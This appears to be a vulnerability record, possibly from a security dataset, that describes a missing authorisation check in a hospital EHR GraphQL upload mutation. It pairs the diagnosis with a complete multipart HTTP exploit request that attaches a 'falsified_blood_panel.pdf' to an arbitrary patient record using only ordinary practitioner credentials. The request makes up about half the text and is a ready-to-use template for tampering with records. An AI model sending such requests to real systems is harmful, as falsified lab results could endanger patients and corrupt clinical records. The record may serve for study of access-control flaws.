diagnosis: The GraphQL mutation allows uploading sensitive diagnostic lab reports to a medical record using patient_record_id. The resolver verifies that the caller has physician credentials but never verifies that the physician has an active doctor-patient relationship with patient_record_id. An attacker with standard medical practitioner credentials can attach diagnostic records to any patient's file across the entire hospital network.
exploit_request:
POST /graphql HTTP/1.1
Host: ehr.health-portal.org
Authorization: Bearer <practitioner_jwt>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMed

------WebKitFormBoundaryMed
Content-Disposition: form-data; name="operations"

{"query": "mutation ($rep: Upload!) { uploadPatientLabResult(patientRecordId: 88401, report: $rep) { patientRecordId success } }", "variables": {"rep": null}}
------WebKitFormBoundaryMed
Content-Disposition: form-data; name="map"

{"0": ["variables.rep"]}
------WebKitFormBoundaryMed
Content-Disposition: form-data; name="0"; filename="falsified_blood_panel.pdf"
Content-Type: application/pdf

[PDF bytes]
------WebKitFormBoundaryMed--
